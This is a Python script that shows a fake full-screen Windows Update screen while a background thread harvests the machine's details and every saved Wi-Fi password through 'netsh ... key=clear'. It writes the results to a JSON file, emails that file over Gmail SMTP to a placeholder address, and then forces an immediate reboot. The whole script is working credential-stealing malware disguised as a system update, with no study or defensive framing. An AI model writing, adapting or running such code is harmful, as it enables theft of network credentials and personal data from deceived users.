import tkinter as tk
import platform
import socket
import os
import subprocess
import json
import smtplib
import threading
from email.message import EmailMessage

OUTDIR = r"C:\Users\Public"
OUTFILE = os.path.join(OUTDIR, "info.json")

EMAIL_FROM = "youremail@gmail.com"
EMAIL_PASS = "putyourapppass"
EMAIL_TO = "recipientemail@gmail.com"
SUBJ = "Winup"
BODY = "Here you go"

os.makedirs(OUTDIR, exist_ok=True)


def grabinfo():
    data = {}

    try:
        sys = platform.uname()
        data["OS"] = f"{sys.system} {sys.release}"
        data["Arch"] = platform.architecture()[0]
        data["Host"] = socket.gethostname()
        data["IP"] = socket.gethostbyname(socket.gethostname())
        data["User"] = os.getlogin()
        data["CPU"] = sys.processor
    except Exception as e:
        data["Error"] = str(e)

    wifi = {}
    try:
        raw = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
        names = [l.split(":")[1].strip() for l in raw.splitlines() if "All User Profile" in l]

        for name in names:
            try:
                d = subprocess.check_output(
                    f'netsh wlan show profile name="{name}" key=clear',
                    shell=True, text=True
                )
                pw = next((l for l in d.splitlines() if "Key Content" in l), None)
                wifi[name] = pw.split(":")[1].strip() if pw else "(No password)"
            except:
                wifi[name] = "(Error)"
    except:
        wifi["WiFi"] = "Failed"

    data["WiFi"] = wifi
    return data


def savefile(data):
    with open(OUTFILE, "w") as f:
        json.dump(data, f, indent=2)


def sendmail():
    try:
        msg = EmailMessage()
        msg["From"] = EMAIL_FROM
        msg["To"] = EMAIL_TO
        msg["Subject"] = SUBJ
        msg.set_content(BODY)

        with open(OUTFILE, "rb") as f:
            msg.add_attachment(
                f.read(),
                maintype="application",
                subtype="json",
                filename=os.path.basename(OUTFILE)
            )

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as s:
            s.login(EMAIL_FROM, EMAIL_PASS)
            s.send_message(msg)

        print("Sent.")
    except Exception as e:
        print("Send error:", e)


def run_tasks():
    info = grabinfo()
    savefile(info)
    sendmail()


class Update:
    def __init__(self):
        self.win = tk.Tk()
        self.win.attributes("-fullscreen", True)
        self.win.configure(bg="#0078D7")
        self.percent = 0

        self.label = tk.Label(
            self.win,
            text="Working on updates...\nPlease do not turn off your computer.",
            fg="white",
            bg="#0078D7",
            font=("Segoe UI", 28)
        )
        self.label.pack(expand=True)
        self.win.bind("<Escape>", lambda e: self.win.destroy())

    def update_loop(self):
        if self.percent < 100:
            self.label.config(
                text=f"Working on updates {self.percent}%\nPlease do not turn off your computer."
            )
            self.percent += 1
            self.win.after(200, self.update_loop)
        else:
            self.label.config(text="Finalizing updates...\nAlmost done, please wait.")
            self.win.after(5000, self.reboot)

    def reboot(self):
        self.win.destroy()
        os.system("shutdown /r /t 0")

    def run(self):
        self.update_loop()
        self.win.mainloop()


if __name__ == "__main__":
    threading.Thread(target=run_tasks, daemon=True).start()
    Update().run()
